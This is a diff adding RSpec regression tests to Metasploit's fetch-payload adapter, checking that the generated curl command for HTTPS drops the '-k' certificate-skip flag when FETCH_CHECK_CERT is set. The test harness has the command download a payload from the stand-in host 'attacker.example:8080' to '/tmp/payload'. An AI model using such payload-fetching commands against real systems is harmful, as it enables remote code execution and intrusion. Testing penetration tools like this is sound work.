@@ -227,4 +227,51 @@ RSpec.describe Msf::Payload::Adapter::Fetch do
       end
     end
   end
+
+  # Regression coverage for curl honoring FETCH_CHECK_CERT over HTTPS. The
+  # HTTPS branch used to hardcode `curl -sko` (-k disables certificate
+  # verification), so setting FETCH_CHECK_CERT had no effect for curl even
+  # though GET and TNFTP already respected it.
+  describe '#_generate_curl_command HTTPS certificate verification' do
+    let(:harness_class) do
+      Class.new do
+        include Msf::Payload::Adapter::Fetch
+
+        def initialize
+          @datastore = { 'FETCH_CHECK_CERT' => false }
+        end
+        attr_accessor :datastore
+
+        def fetch_protocol
+          'HTTPS'
+        end
+
+        def download_uri(_uri)
+          'attacker.example:8080/payload_uri'
+        end
+
+        def _remote_destination
+          '/tmp/payload'
+        end
+
+        def _execute_add(get_file_cmd)
+          get_file_cmd
+        end
+      end
+    end
+
+    subject(:harness) { harness_class.new }
+
+    it 'skips certificate verification with -k when FETCH_CHECK_CERT is false' do
+      cmd = harness.send(:_generate_curl_command, 'payload_uri', false)
+      expect(cmd).to include('curl -sko ')
+    end
+
+    it 'verifies the certificate (no -k) when FETCH_CHECK_CERT is true' do
+      harness.datastore['FETCH_CHECK_CERT'] = true
+      cmd = harness.send(:_generate_curl_command, 'payload_uri', false)
+      expect(cmd).to include('curl -so ')
+      expect(cmd).not_to include('-sko')
+    end
+  end
 end
